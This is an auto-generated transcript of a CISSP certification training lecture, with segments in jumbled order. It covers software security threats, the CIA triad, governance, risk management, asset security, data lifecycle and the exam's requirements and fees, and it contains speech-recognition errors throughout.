the access to the facility moving on to
our eighth and final domain we have
software development security as the
name suggests this domain talks about
security in a software development
lifecycle here we will be looking into
topics like api malware spyware adware
social engineering attacks and sql
injection attack let's start off with
the application program interface known
as api api is basically a collection of
protocols and functions used to create
applications it supports formats such as
representational state transfer rest and
simple object access protocol rest is
nothing but using the present features
of the web in a simple way and soap
which is an acronym for simple object
access protocol is a messaging protocol
for exchanging data among computers now
let's move on to malware as a security
threat malware is a term which refers to
malicious software viruses ransomware
and worms we can also call trojan virus
as a form of malware which is capable of
disguising itself as a legitimate
software
malware is basically a broad term that
refers to a variety of malicious
programs one way to protect your
software from malware is to always
double check your downloads moving on to
our next security threat spyware as the
name suggests this is a software that
typically spies on your system spyware
is also a type of malware which is used
to secretly gather information of the
victim to give it to a third party those
programs that secretly record all that
you do on your computer are called
spyware it is always advised to turn on
pop-up blockers to prevent spyware
next up we have adware adware is also
known as advertising supported software
it is a type of malware that constantly
displays ads and pop-ups some of such
ads can also gather your information at
times adware is not all that dangerous
but it is a hassle as it is a gateway to
unwanted advertising on the screen and
it can also change the browser home page
adwares are known to display unwanted
annoying advertisements on your screens
let's now have a look at social
engineering attacks it is basically the
art of manipulating people so that they
end up giving their confidential
information this attack lures victims
into handing over their confidential
data this attack takes place by tricking
the human mind the most common social
engineering attacks are fishing spear
fishing and whaling fishing attack
phishing attack is a practice wherein
the hacker usually sends fraudulent
emails which appear to be coming from a
very trusted source this is done to
install malware or to steal sensitive
data like credit card information and
various other login credentials
spear phishing attack is a variation of
phishing here the attacker targets a
specific individual or a group of people
and in wailing phishing attack wealthy
powerful and prominent individuals are
made targets moving on to our next
attack we have sql injection attack sql
injection attack is a type of code
injection attack in a database driven
website the hacker manipulates a
standard sql query it allows attackers
to tamper with the existing data here
malicious code is inserted into the sql
server to obtain information so in
cisshp as with every security course we
start off with the cia triad now here
cia
is confidentiality integrity and
availability so it starts off with every
security mechanism when we talk about
security and we want to keep things
secure what is it that we want to secure
it is the data of an organization that
is the most valuable asset to the
organization and that's what we want to
secure when we say that we want the data
to be secured we basically talk about
three aspects for that data the first
and the foremost that the data needs to
remain confidential the second aspect
that the trader needs to be trustworthy
and the third concept that the data
should be available to all authorized
users when and where they require it so
going back to the first point when we
say we want data to be confidential what
do we mean by that by confidentiality we
talk about that data being made
available only to authorized users after
you have authenticated them insured or
assured of their authenticity and only
then you're going to give access to that
data right so even if you go into an
organization an organization has a
hierarchy of governance right so only
certain people with certain clearances
or certain job titles can have access to
certain amount of data whereas other
people may not have access to it for
example a person working in the sales
department will not have access to data
that is accessed by the hr department
thus that's what we are looking at
classification of data and keeping it
confidential only making it available to
those people who require it when we say
trustworthiness or the integrity of that
data the integrity is where the data has
been altered modified removed deleted by
unauthorized people so we want to
prevent that which means when we say we
want the integrity intact we want to
ensure that only authorized people can
modify alter or remove data if they are
allowed to do so so that's where the
authorization and authentication comes
into the picture again and data needs to
be available for me to safeguard data i
can just lock it up in a safe throw the
safe in the depth of an ocean and say
that the data is secure because it
cannot be leaked out but that data is no
longer available to authorized users
hence the data is useless for me data
would have value when the data remains
confidential has its trustworthiness
intact and is still available to all the
users that are authorized to access it
so when we talk about security we want
these three aspects to be implemented on
any and every digital asset that the
organization has and thus once these
three points are guaranteed or at least
assured to a certain extent we can then
say that the data or that particular
asset is secured moving on let's talk
about information security information
security is the process of protecting
data and information systems so in the
cia as we talked about it when we said
what do we want to protect we want to
protect all the information assets or
the technical assets that we have from
any of the vulnerabilities that can be
identified so we want to restrict
unauthorized access and use we want to
restrict deletion accidental or
intentional if they have not been
authorized to do so modification of data
so the integrity part and destruction of
data destruction could not only be
deleting data but it could be something
like ransomware where the data gets
encrypted so it's still there it's just
not accessible to you now information
security ensures the implementation of
these following aspects the first and
foremost comes from information security
policies which is the governance aspect
of it the policies are designed to have
a implementation of security in an
organization that helps the business
processes to be executed in a secure
manner where are these policies coming
from they come from standards or
guidelines which are globally available
and based on which we can start
developing our security policies for
example if i want to develop a security
policy in my organization i might want
to depend on frameworks like iso 27001
cobit or something similar once i have
these standards set i would come back to
procedures procedures being how are
these standards to be executed right for
example in my policies i ensured that i
want encryption of aes 256 to be
implemented or rather in the policy i
determined that we want encryption to be
implemented on a data set because based
on the classification of those data so
in my policies i would determine how the
classification is going to work how data
is going to be classified on what
parameters and thus once the data gets
classified we are going to come back to
standards where we say if it is
classified as a confidential data we
want to use encryption to protect that
data and we want aes256 to be utilized
for encryption so how do we go about it
how do we implement the encryption
that's where your procedures come into
the picture your guidelines are
troubleshooting mechanisms optional
documents so if somebody has trouble
following the procedures they might want
to go into the guidelines and see how to
troubleshoot the scenario that they are
facing baselines are basically the
minimum achievable target that you want
to go with with these policies so let's
say when i say i want to have a baseline
on a server where for the server to be
published onto the internet or to be
used in production environment it has to
meet a certain criteria which means i
can go back to the hardware and i can
say the server needs a hardware
configuration of x y and z let's say a
processor a xeon processor with 16 cores
128 gigs of ram so that's a baseline
that i need for a particular server for
it to be put into production environment
for a particular use anything above that
is acceptable but nothing should go
below that then comes the risk
management while we are implementing
these policies procedures we have those
standards in place if we face any risk
during that period or if we face any
threat or a vulnerability is identified
during this period all these terms we
are going to discuss in a little bit so
when we identify vulnerabilities or
threats that's where our risks come into
the picture the risk management comes in
saying okay this is a risk that we have
identified and now how do we want to
mitigate the risk then the security
organization comes into the picture the
day-to-day activity of how security is
to be implemented and for all of these
procedures policies baseline standards
to be implemented to be ensured that
there are to be assured that they are
working properly we need to make our
employees aware that these policies
exist this is something that they need
to follow thus the awareness or the
security education comes into the
picture here the security education is
more focused on helping employees adhere
to the company policies and standards
rather than educating employees about
security we don't want to make everybody
a ethical hacker we just want to ensure
them or we want to assure the
organization that everybody has been
warned about policies procedures
security requirements and they are going
to follow those requirements for example
a password policy where you have to
adhere to a specific password policy to
ensure passwords are created at the same
time there is another password policy
which says that you should not share
passwords with your colleagues no matter
what so for me for my employees to
follow that i need to make them aware
that these policies exist and there are
repetitions if they do not follow these
particular policies so coming back to
the governance part what is governance
since we have been talking about it
governance ensures that the security
strategies are aligned with business
objectives and consistent with
regulations so what does it guarantee
appropriate information security
activities are being performed based on
what based on the policies that we have
created based on the standards that we
have and the baselines that we would
have created so security has to be
comparable right so if i say i have
secured against particular attacks the
attacks have to be identified and then
compared to those particular attacks i
can say i have mitigated these
activities by having specific security
controls thus i can say that i am secure
the governance aspects keeps a watch on
all the security controls to see that
those security activities are insured
are being implemented and are performing
to the best of their abilities that's
where your governance comes into the
picture the risks being reduced so the
risk management also comes under the
governance where are looking at newly
identified risks and you are then
implementing security controls that
would mitigate these risks then we are
looking at information security
investments appropriately directed so
when i say i want a security control
which would be a firewall ids ips
antiviruses whatever is required it
needs to have a return on investment
which is acceptable for the organization
you don't want to spend up too much of
money in security thus creating losses
for the organization when you say a
business a business objective is always
to make money rather than lose money so
security should be a supporting feature
to the business objectives where the
services are being provided by the
business in a secure manner in such a
way that they can still have a positive
return on investment on the services
that are being provided and the
executive management can determine the
program's effectiveness this is the
major part because we have to even in
any compliances audits technical audits
we have to prove that whatever we have
implemented actually works is effective
does mitigating the risk if your
security controls are not effective then
you have just wasted a bucket load of
money and have not achieved any security
measures in your exercise moving on to
security controls security controls are
measures taken to safeguard an
information system from an attack
basically for the cia triad the
confidential and integrity and
availability so security controls could
be administrative controls technical
controls of physical security controls
what are administrative security
controls there would be policies
procedures that we have in place so the
password policy becomes an
administrative control where the
management has made everybody aware that
the password needs to meet a particular
complexity should not be shared and thus
becomes an administrative security
control a technical security control
would be where we are implementing this
policy and thus when i try to create a
password there is a software that maps
the password to the complexity
requirements assures or ensures that the
complexity requirements have been met
and does allows the password to be
accepted or rejects the password as the
case may be that is a security control a
physical security control maybe let's
say a cctv camera which you are going to
use to monitor people and
ensure that nothing untoward happens
it's not only against physical crime but
let's say access to a particular room
where nobody's seen tailgating uh maybe
monitoring a server room which is very
well secured and ensuring that
unauthorized people do not get access or
purposefully or intently do not access
that area at all times so these are the
three levels of security controls that
can be implemented to enhance the
security of an organization then we come
to security policies policies is an
overall broad statement produced by a
senior management that dictates the role
of security within the organization for
example the password policy that we
talked about it just said that it needs
to meet a certain complexity which is a
broad statement that is being made by
the management saying we want to adhere
to this policy to ensure that we do not
get hacked by brute force attacks or
dictionary attacks or whatever it is the
broad statement is trying to prevent
certain attacks from happening on the
organization how it is implemented
that's where the procedures and
everything else comes into the picture
it must integrate security into all
business processes so if i start
creating a policy which ensures that the
complexity should be so high that the
password should be at least 20
characters strong that would be
detrimental to the organization's health
because people may not remember those
passwords or resetting those passwords
or having technical mechanisms technical
security controls in place to implement
that kind of stringent security may be
too expensive to have so whatever
policies are created they need to be in
in line with the business processes as
well the policy must be reviewed and
modified periodically or as company
changes so as and when the company
becomes more mature and can have more
levels of security they must look at
their policies again and redefine them
or as a company grows or changes market
scenarios or changes business processes
these policies may become redundant so
you want to look at those policies and
implement newer policies or modify the
existing policies to suit the business
processes in a better manner it must
support vision and mission of the
organization a business once established
will always have a long-term vision for
example the e-tailer example that we are
talking about for me to open a e-tailer
e-retailing website i don't want it to
be periodic i don't want it to be for a
month or something like that i want to
achieve success in that factor and i
want to create a plan of where i want to
reach let's say in the next five years
so how do i achieve that that's
something that i need to plan as a
business plan all my security mechanisms
that are in place should be in alignment
with the business plans business visions
across the number of years that we have
envisaged the business to perform so
that's where the policies come into the
picture policies are always long-term
not short-term documents but need to be
periodically reviewed and modified as
the business grows or business changes
its posture then looking at compliance
compliance means confirming to a rule
such as a specification policy standard
or law so we have looked at compliance
from a perspective where we talked about
iso 27001 or pci dss or those frameworks
now these are not laws but these are
standards of frameworks that have been
created over a period of time through
experience and these are targeted
towards organizations towards specific
industries for example pci dss is only
towards finance organizations where they
have payment gateways in place the iso
27001 is a more generic policy which can
be implemented by various organizations
hipaa health insurance portability and
accountability act is an american act
that talks about uh health related data
of its citizens so these are compliances
these may not be laws but you need to
adhere to these to be effective and to
be
allowed to conduct business in that
particular industry then we have code of
ethics code of ethics state safety of
the commonwealth duty to our principles
and to each other requires that we
adhere and be seen to adhere to the
highest ethical standards of behavior
therefore strict adherence to this code
is a condition of certification what are
the ethics protect society the
commonwealth and the infrastructure act
honorably honestly justly responsibly
responsibility and legally prove
diligent and competent service to the
principles advance and profession now
the code of ethics are codes created by
iic square for the cissp professional
and you need to adhere to these codes if
they identify violation of these codes
from any member they would debar the
member strip them of the certification
and even blacklist them to based on
whatever
ethics they have violated so even before
the exam you have to go through the code
of ethics you have to accept the code of
ethics in the exam you may get get up to
five to six questions just on code of
ethics then comes the legal systems uh
that's where the law comes into the
picture
law could differ from country to country
or from region to region and thus
depending on which country you are in
you may need to be aware of those laws
of those countries as far as cssp is
concerned ise square is concerned they
are an american organization so they
would talk about mostly american laws
and a few european laws or directives as
well so there are three different laws
that we talk about civil common and
religious laws depends on the country
the culture of that particular country
the information security professional
should understand the different legal
systems followed internationally so
you also may come across the
classification as civil law criminal law
and law of torts civil law is basically
a law where let's say a contract has
been breached and it's not criminal in
nature you just want to sue an
organization for breach of contract
criminal law is where something criminal
has happened under the particular act of
that particular country like let's say a
murder or
an attack that has happened a physical
attack or something got stolen and the
third one was the law of torch where
it's more of a compensatory law where
you can file a case a civil suit uh
demand compensation in lieu of the
wrongs that have happened to that
particular organization or that
individual then comes the personal
security the person the other people
inside the organization need access to
data to complete their assigned work and
hence have the potential to misuse these
privileges and thus you should have
personal security as well now when we
talk about hiring practices for people
most of the organizations perform
background checks and we get confused by
these background checks are being done
the background checks are essential to
the health of the organization where you
are ensuring that the person is not a
malicious person has the prerequisite
certifications or the qualifications
have never been debarred or have never
been prosecuted do not have a criminal
background thus preventing physical
attacks on the organization for example
a competitor may attempt to place in
your organization a spy to spy
to gather information on the secrets of
that organization and report it back to
the competitor a background check may
reveal that this person was previously
employed by a competitor and thus you
might want to verify that how that
employment got terminated when did it
get terminated or is this person
misusing anything or misrepresenting any
aspect of his or their life then you
also need to get confidentiality
agreement signed with them for example
ndas non-disclosure agreements data that
is being shared with them the ownership
of that particular data and what are the
repetitions if that confidentiality is
breached by that particular person
conflict of interest agreements for
positions handling competitive
information as you go higher up in the
organization you might come across
contracts where it prohibits a
particular person in engaging and act
into the same activity with the
competitor for a particular period of
time so if there's a conflict of
interest when you're hiring a person
where they have signed and such a
agreement with another competitor or
another organization
you don't want to embroil yourself in a
lawsuit where uh the other organization
may sue you for hiring a person while
they were still under that particular
contract so it's not only to look at the
background of these people but to
safeguard the organization from any
lawsuits or any violations of contract
as well get the non-compete agreements
for the positions in charge of unique
corporate processes that again goes on
to say if you're going to leave the
organization you cannot start up a
competing business similar to the
organization's business and so on so
forth now let's come back to the
technical aspect and start talking about
vulnerability threats and risk now what
is a vulnerability it is nothing but a
weakness in a system or a process
implies the absence of a counter measure
vulnerability is internal and is more
easily managed so it's uh basically a
flaw or a misconfiguration or a design
flaw or uh something like using defaults
username passwords configurations where
if that particular flaw is misused it
will lead into a security event on that
particular device for that particular
organization so when we say a city a
security event it has to be detrimental
in nature so if somebody is using a weak
password that can easily be cracked that
is a vulnerability where you have
identified a weak password and then you
want to prevent that vulnerability by
imposing a security control or a counter
measure the security control here starts
off with the policy of having a robust
security policy where a password policy
comes in that describes the complexity
of a particular password and then you
talk about a technical countermeasure
where you have implemented an identity
and access management plan which would
ensure that the person creating that
password adheres to the complexity of
that particular policy then a threat the
threat is the possibility that the
vulnerability might be exploited which
will result in loss so if somebody has
created a weak password and it has been
allowed that's a vulnerability which can
be exploited by the usage of brute force
attacks or
dictionary based attacks to crack
passwords if the password is cracked
somebody unauthorized may get access to
that data thus resulting in a loss for
that organization so the threat is the
possibility of that particular
vulnerability being exploited and then
comes the risk the risk is basically the
likelihood of that attack being
happening so i have a weak password it
can be exploited by a brute force
dictionary attack the likelihood of that
attack is what determines the risk level
for me now the likelihood will always be
hypothetical but we don't want to run
helter skelter and we do not want to
take uh the possibility to extreme so
that's where your business processes
come into the picture your security
policies come into the picture based on
the business processes and the policies
implemented if i have a weak password
what would be the loss that i would face
for that particular person for example a
fresher coming into an organization
having a weak password but having
limited access to uh data would have a
lesser risk because of the loss being
lesser than a ceo of an organization
using a
weak password and thus getting exploited
because the ceo will have access to more
proprietary data that if
gets into the competitor's hand would
lead in huge losses thus the same risk
of having a password cracked for a
fresher will have a lesser loss does a
lesser risk compared to the same risk to
a ceo where the loss would be higher so
a threat could also be in multiple
aspects threats could be natural that
means to fires flooding tornadoes
anything that is an act of god that can
happen with minimal human interaction or
the second threat would be man-made
where man is responsible for it like
theft hacking writing war anything that
is created by a man or rather humans and
technical in nature could be software
bugs where vulnerabilities create are
created or server failures where
something technical has gone wrong and
you need a technical as skilled person
to come in and repair that particular
aspect then the fourth one would be a
supply system failure or a chain supply
failure where you have dependencies for
example any organization will have a
dependency on an electricity service
provider where they are providing
electricity as a service which powers on
the id infrastructure if the service
provider fails and there is electricity
or a power cut your systems are not
going to work thus you need a secondary
mechanism to prevent that threat from
being realized once we have identified
these threats we have identified these
vulnerabilities and we have identified
the likelihood and the probability of
that attack that's where we come across
the risk management exercise now what is
risk management risk management is a
hypothetical exercise where we have
identified a vulnerability we have
looked at the threat that it may have
and the likelihood of that for our
threat being realized once we have
identified the threat uh the risk level
that's where the risk management comes
into the picture reading from the slides
a core component of enterprise security
program why because we need a baseline
and we compare security to a baseline
for example i've got a firewall that has
been configured in a particular manner
now when i do a vulnerability assessment
on the firewall it the vulnerability
assessment gives me a report that states
that some of the rules may now be
redundant thus allowing access to
unauthorized users this becomes a risk
or this becomes a threat if this threat
is identified by unauthorized people
they would then try to attack this
firewall to gain access to that data
which they are unauthorized to access
does
leading to losses for an organization
what is the likelihood of this happening
if the likelihood is high
or low that's what the risk management
program is all about right and based on
this risk we implement security controls
we manage the security controls and then
we verify the security controls for
future risks to coming into the picture
it must be defined and it is always
defined as an ongoing project because
risks will always change based on the
businesses based on the security
controls that you have this will give a
guidance to an organization of how
security is being implemented how it has
enhanced over a period of time and how
security mature that organization has
become because of the risk assessment
program it also helps you to satisfy two
aspects due diligence and due care what
is due diligence due diligence is
basically the research that organization
does in identifying those risks and
mitigating them the due care is the
actual part of mitigation where you have
implemented a security control to
mitigate the risk that you have
identified so if companies negligent
that means if the company doesn't have a
risk management program it is not going
to be that security
oriented or the security is not going to
be that great does the company may not
comply to laws regulations and standards
thus causing them penalties lawsuits and
other repetitions in the industry based
on whatever they are doing for risk
management we come to frameworks the
frameworks are used to categorize
information systems so that we can
identify threats or risks based on the
classification so this classification
helps us determine the criticality and
the sensitivity of information system
right so what is the sensitivity and
criticality it basically gives us an
understanding of the value of the asset
that we have so if you go back to domain
one the asset value or the asset
identification asset security that's
where it comes into the picture
obviously our database server is going
to be more secure than an end user
laptop based on the data that they have
thus the criticality of the system for a
database is much higher than the end
user's laptop then we look at the
security controls that can be
implemented then for those the
frameworks like iso 27001 comes into the
picture there is kobe there is there are
a lot of frameworks out there nist 800
iphone 53
then we talk about assessing the
security controls once we have placed
those security controls we need to
verify those controls are placed
properly they actually mitigate the risk
and are appropriate to correctly
mitigate that particular risk that they
are created then looking at authorizing
information systems grant information
systems operations based on risks
determined so you have identified risks
you have authorizing some of them some
of the devices to function in a
particular manner based on which some of
those risks would be mitigated or would
be reduced to an acceptable level so in
the cissp we talk about a lot of risk
assessment strategies we look at how we
can manage risks the four different
types of managing risks would be one is
to mitigate other is to transfer the
third is to accept it and the fourth one
is to neglect the risk so uh in the
cissp it talks in great details about
those risk assessment strategies uh we
are talking about the four types of risk
mitigating strategies they are risk
avoiding or avoiding the risks accepting
the risk transferring the risk and
limiting the risk so uh in the course we
basically talk about a lot of risk
strategies and how to mitigate these
risks and
how they can be implemented to bring
down to a acceptable level so again risk
acceptance risk
appetite of an organization comes into
the picture these terms are then
discussed uh in the training to
understand how the policies would work
around the risk management strategy
moving on then looking at monitoring
security control so once we have
security controls in place we have
assist them we also need to monitor them
for the effectiveness and though they
are going to create any alerts or any
risks are being realized or any new risk
that may be created by the security
control implementation so in these risk
assessment these are the frameworks
these are the steps that we want to
follow to identify mitigate and monitor
these risks so the management begins
with risk assessment what do you mean by
risk assessment identifying the impact
of the risk that the risk would have on
the organization and there would be two
different ways to assess the risk a
quantitative assessment or a qualitative
assessment a quantitative assessment is
more quantifiable or is numerical in in
its process where you're looking at
assigning costs to particular assets and
the threats so the losses that you may
figure out in a risk assessment strategy
would be more numerical where would be
in a currency format where let's say a
risk if realized would lead to a loss of
a extra amount of dollars that's where
the quantitative analysis comes into the
picture the qualitative analysis would
be quality of a service so if a service
is being affected because of a risk what
is the degradation of that service to
what aspect is is it getting degraded
for example internet that we use if
there is an internet outage or if there
is a reduction in internet speed right
so if i've got a 10 mbps line and now
because of some fault of the isp it gets
reduced to 4 mbps i may not be able to
conduct the business that i would i was
doing on a 10 mbps line thus the quality
of that device has degraded uh does it
is going does it is a risk and it is
causing me losses right so qualitative
risk analysis would be more descriptive
in nature rather than be numerical in
nature
most of the companies or organizations
would follow a hybrid policy because it
is not possible to have a quantitative
quantitative risk analysis in each and
every scenario new organization which
doesn't have much data to rely on
historical data of how threats have
affected that particular organization
may go in for a qualitative one and as
they mature over time in the security
practices they may then turn over to a
quantitative risk analysis or a hybrid
risk analysis where they're using a
combination of quantitative and
qualitative both thus the risk controls
that we were talking about risk
acceptance risk reduction and risk
assignment
there is risk avoidance as well so there
are four controls the risk reduction is
where you have implemented a security
control
based on which the risk has been reduced
to a more acceptable level risk
assignment is where you're also known as
risk avoidance that's where you're
avoiding risk by outsourcing it so
talking about risk controls again the
four types being accept avoid transfer
and reduce risk acceptance is where uh
your the organization is willingly
accepting the risk as the way it is
because they don't want to deal with it
right now they might deal it with it in
the next iteration or it doesn't it is
at an acceptable level and the company
just wants to move on avoiding the risk
is where you are going to try to not use
the service where the risk exists thus
avoiding is where uh you have identified
a particular service where the risk
exists and now you're not using the
service to avoid the risk altogether
risk limitation or risk reduction would
be where you are implementing a security
control to mitigate the risk and then
risk transference is where risk
assignment comes into the picture where
you are transferring it to a third party
like outsourcing it by using insurance
to limit the risk so for example the
threat is of a fire the risk is high but
you cannot do anything about it so you
purchase insurance so if the fire
actually happens you would still be
reimbursed for the losses that you have
faced coming back to counter measures we
have discussed administrative uh
countermeasures these are policies rules
regulations laws customs that a company
needs to adhere to based on the industry
that they are in then there are
technical controls software controls
anything that is technical in nature ids
ips firewalls encryption anything that
is going to help you implement the cia
and then physical where you would look
at
locks on those security guards at
offenses where they're preventing access
to unauthorized people let's talk about
roles and responsibilities of management
now as far as management is concerned or
the hierarchy is concerned
you can see on the screen there's a
senior management the security
professional data owner custodian and
user now these are from exam perspective
from the certification perspective
obviously the hierarchy in an
organization would be slightly different
but here the senior management is the
responsible party for the entire
security mechanism so they must drive
the entire security pro exam so cissp
talks about a top-down approach where
the senior management has realized the
importance of security and is
implementing at all levels within the
organization thus they are a part of it
and they are supporting the security
program they define the tolerance of
risk of how much risk is stopping to be
tolerated by an organization from a
monetary perspective or the qualitative
perspective as well depending on the
laws legislations regulations
compliances and the contracts the
business has signed they will rely on
security professionals to manage the
risk but the exercise and the management
process has to be defined by the senior
management once the security team comes
up with the counter measures the senior
management either approves or
disapproves them based on the return on
investment of that counter measure the
security professional assist with the
development of policy documents gives
their inputs because they are the people
who are in the day-to-day process of
dealing with these thus they can
identify gaps and give
good inputs to modify or to create the
policy in a more robust manner the
security professionals may be a part of
the risk assessment and risk management
team as well especially uh the security
technical aspects of it assist with the
implementation and maintenance of
countermeasures so the administrative
technical or physical measures that you
have identified you may be requested to
implement that for example the locks
that we have on the door the swipe locks
that are connected to a database where
the database is maintained so as a
security professional you wouldn't be
responsible to fit those locks but to
create the database manage and maintain
the database where that information is
kept upon where people are authorized
and authenticated and would be
responsible for monitoring auditing and
security assessments as well the data
owner the owner of that particular data
part
would normally be the head of the
department for example the sales data is
normally owned by the director of sales
of that department so that they would
ultimately responsible for identifying
that data classifying that data and
accepting the security controls that are
implemented they may request for
additional security controls if they
deem fit the security professional
implements these security controls then
the custodian a person who is
responsible for implementing the
approved security controls or managing
the day-to-day activity of the security
controls for example the security
professional has identified an access
control to be implemented on a data set
that the data owner owns the data owner
has approved of it it is the custodian
who is going to implement that strategy
or implement the control uh on it the
user is basically the user who or the
person who accesses the information and
id resources does whatever access
controls have been implemented would
identify the user authenticate authorize
them and help them accountable for
whatever they are doing if the user is
unable to authenticate access would be
denied we will focus on the second
domain of cisp which is asset security
so let's understand the need for asset
security through a small scenario well
it was yet another regular day in tim's
organization everything was going on
fine until the organization faced a
cyber attack the hacker hacked all the
servers in tim's organization the
organization had loads of data not all
of the data had the same level of
protection the level of protection
varied from one piece of information to
another in this scenario the hacker
could hack into only that particular
data which was less protected however
this cyber attack had a huge impact on
the organization in addition to this it
was also discovered that there was some
flaw in the information classification
process that exposed even sensitive data
to a cyber attack in other words even
crucial data was left with very less
protection this gave rise to asset
security asset security is defined as
the process of collecting and protecting
assets such as data and devices asset
security helps an organization
understand and classify data with
respect to its importance which in turn
makes sure that highly valuable data
receives the most protection
asset security achieves its goals
through its domains the domains are
information classification then we have
data classification data lifecycle data
remnants and finally we have data loss
prevention each of these domains have
different goals
all of these domains together make up
asset security now let's have a look at
each of these domains individually first
up we have information classification as
you saw what happened in tim's
organization it has understood that
importance of data varies largely we
have to classify data before we can move
on to protecting it we need to be able
to identify which is the most crucial
data with respect to organizations
information classification is defined as
a process of segregating data based on
its importance to provide adequate level
of protection to every piece of data
information classification is different
for each sector based on their
objectives the classification varies in
the general sector information
classification is used to minimize risks
on crucial information whereas in the
government or military sector it is used
to prevent unauthorized taxes and
finally in the commercial sector it is
used to keep sensitive information
private here it is seen to it that
information is not disclosed to a
company's competitors let's now move on
to our second domain that is data
classification as the name suggests here
data is basically classified based on a
set of considerations here we will look
into factors like data retention
requirements then data security
requirements data disposal methods data
encryption requirements and finally
compliance requirements so these are the
factors which are taken into
consideration while classifying data
this entire process of data
classification is taken care of by the
data owner in addition to the
classification they also analyze the use
and value of the available data to the
company
finally the data owner also annually
reviews the data classification before
classifying data an important step is to
understand the data life cycle all of us
speak of data all the time however do we
know the various steps a piece of data
goes through well for that let us have a
look at the third domain data lifecycle
we will start off from the data creation
step and understand what happens to the
data after that as you see on your
screens we have six steps in the data
life cycle stage they are create store
use
share archive and destroy starting off
with the create phase this is the first
step in data life cycle here new data is
generated or the existing data is
updated after the data is created we use
data repositories to store the created
data without storing data we cannot
derive any information from it hence
this step is very crucial in the third
phase data is viewed or used in some
application or processed in addition to
data being viewed and processed it is
also shared between various users and
customers our fifth face is archive here
data which is not used frequently that
is inactive data is identified and then
moved into long-term storage systems and
finally we have the destroy face as the
name suggests data is simply destroyed
here data can be destroyed either
digitally or physically not to forget
you cannot simply destroy data it should
be done based on regulations but have
you wondered what happens if data is not
destroyed even after we try our best to
erase it well this gives rise to data
remnants in simple words data remnants
is a term used for the residual of
digital data which remains even after
attempting to erase that particular data
data remnants should be avoided as it is
not good to have remains of a piece of
data which was intended to be destroyed
security professionals should be well
versed with techniques to avoid data
remnants so how do we tackle data
remnants for this we have various
methods they are purging clearing
overwriting degaussing storing and
finally destruction let's have a look at
each of these methods individually and
understand how they help in tackling
data remnants
first up we have purging purging is done
to minimize risks on crucial information
in clearing data from storage devices
are removed however it can be
reconstructed by using various softwares
third we have overwriting here we write
over the original data several times so
that the original data cannot be
recovered decausing is the method used
to destroy data on magnetic storage
tapes next up we have storing before
storing data on media the data is
encrypted for the purpose of safety
finally the sixth method is destruction
here storage device which hold the data
are physically damaged incineration
crushing and shredding a few of the
methods used for destruction now let's
move on to our fifth domain data loss
prevention in this domain various
security measures are adopted that will
help in making data available to only
the authorized users here we will look
into four of such measures the first
measure is data inventory in this step
data is identified and then classified
in the second step the data flow is
plotted over the life cycle the third
measure is data protection strategy here
a number of risk assessments are
performed the fourth measure is
implementation in this step we take up
cases which have had a history of data
loss for testing purpose those were the
five domains under asset security in
addition to these it is also required
that we understand the term privacy with
respect to asset security privacy is a
very crucial aspect when it comes to
western security information privacy and
data privacy are more or less the same
this term is used to differentiate one
person from another it relates to the
personal data stored on computers so
what kind of data falls under this
category well we have data such as
medical records office data financial
data etc which fall under this category
to uphold privacy we use technologies
like pseudonymization tokenization and
anonymization well pseudonymization
refers to a data management process
anonymization refers to a process of
either encrypting or removing personally
identifiable data so that people who the
data describes remain anonymous and
finally in tokenization a sensitive
piece of data is substituted with a
non-sensitive equivalent
cissp stands for the certified
information security or rather certified
information system security professional
it is considered as a cool standard in
the field of information security it is
a management certification so when
you're in the senior management this is
the kind of certifications that you
would require for your uh management
skills now this is a non-technical or a
semi-technical
certification here it's nothing about
vulnerability assessment or penetration
testing you're not going to do anything
hands-on you are not expected to know
hacking or you are not expected to know
how to configure firewalls anti-viruses
and whatnot it's basically something
that
over a period of years of experience you
have evolved a certain understanding of
how security policies should be
constructed how they should be
implemented and how security affects an
organization so here you are responsible
to create a overall security policy for
an organization to help maintain the
security posture of an organization now
as far as the certification is concerned
it has a validity of three years after
which you don't have to give the exam
again however during these three years
you have to earn a certain point so it
is known as a continuing education
points that isc square allows you to
generate points by attending lectures or
by attending webinars by publishing
white papers by providing trainings
obviously all of these should be
authorized and you should have a
validation from a authorized party that
you have done this activity once it is
verified you will be awarded certain
points once you have collected
sufficient number of points you will
retain your certification beyond three
years the passing rate of this exam is
less than 50 so it's not how much you
require to score what this basically
tells you is the amount of people who
actually clear the exam in the first
attempt now let's not get disheartened
because of this
essentially the exam is quite tough it's
known as a mild white and inch deep exam
that means you need to know just about
everything and anything that is there to
be known in information security and
that's something that we are going to
discuss when we go into the eight
domains of cissp what happens is there
are a lot of people who are not actually
prepared for the exam who think they are
prepared attempt the exam and sadly fail
in their first attempts some people just
misjudged the exam and not
prepared for it so the fact that i'm
trying to put across is be very well
prepared i have seen people who study
for months together attempt a lot of
questions ensure that their knowledge is
up to the mark and only then do they
attempt the exam
anybody can register for the exam to be
honest and clear the exam as well
however to get certified there are two
different avenues so if you have a
experience of at least five years in two
of the domains that are in the cissp
course you get certified so even if you
clear the exam there is a validation
process that happens after the exam
where you have to submit documentation
to prove to isc square that you have
that level of experience and once it is
pro proven and validated you get
certified as a cissp if you do not have
that five years of experience you get
certified as an associate of isc square
for cissp and they give you six years
during which you can achieve the level
of experience prove it to them and then
get certified as a cissp so you can see
the stringent levels that are taken for
this certification the validation is
basically documentation and
proof that you have to submit and which
is verified so even after you clear an
exam to get validated and get certified
it can take up to five to six weeks for
uh ise square to validate and provide
you with the certification with that
let's go and see the exam let's have an
overview of what the exam is all about
the governing body is ise square that's
what we have been referring to and the
professional experience at least four
years of college degree or additional
credentials from isc squares approved
list that will satisfy one year of
required experience and five years of
paid full-time work experience in two or
more domains like i said anybody can
give the exam register for it attempt it
once you clear then that's where the
criteria of your work experience comes
into the picture you prove five years of
experience probably by a letter from
your organization from your hr saying
you have this kind of experience that is
relevant to the certification there will
issue validate it you get the
certification if you don't have that
experience you get associate of isc
square and then you get six years to
attain that level of experience after
which you can get certified the exam
fees were 699
so it's an expensive exam a single
attempt for each voucher so if you fail
that's another 700 for the second
attempt the fact being if you fail for
the first time you cannot attempt the
exam for the next 30 days if you fail
for the second time you cannot attempt
the exam again for the next 60 days and
if you fail for the third time you
cannot attempt the exam for another 90
days so there's a cooling off period
after each attempt so i would suggest
study hard go for the first attempt
clear it and nail it the maintenance
fees for your certification is again 85
us dollars for three years the exam
length is three hours and the questions
could vary from 100 to 150 150 being the
max questions that can be asked in that
exam you can clear the exam well before
150 questions so be prepared for that as
well but imagine when you're walking
into that exam bear in mind that you
will be asked 150 questions and you have
to time those in three hours 180 minutes
that's what three hours is so if you do
the math not much time for every
question so it's just a minute and a
half or less than that for each question
and the questions could be very
descriptive could be confusing so you
